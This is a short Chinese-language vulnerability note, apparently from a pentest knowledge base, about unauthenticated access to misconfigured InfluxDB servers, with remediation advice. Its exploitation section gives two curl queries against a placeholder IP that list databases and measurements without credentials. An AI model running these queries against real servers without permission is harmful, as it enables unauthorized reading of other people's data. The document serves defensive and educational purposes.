### 一 漏洞描述
InfluxDB是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。

若开发者在使用时配置不当，则可能引发InfluxDB未授权访问漏洞，攻击者可以在未经认证的情况下，直接操作数据库中的数据。

### 二 漏洞利用
列出所有数据库：

curl -G 'http://1.1.1.1:8086/query' --data-urlencode 'q=SHOW DATABASES'


查看对应数据库的measurement（相当于mysql中的table）

curl -G 'http://1.1.1.1:8086/query?db=jmeter' --data-urlencode 'q=show measurements'

### 三 漏洞修复
1.仅监听localhost，防止外部未授权访问

2.添加认证。


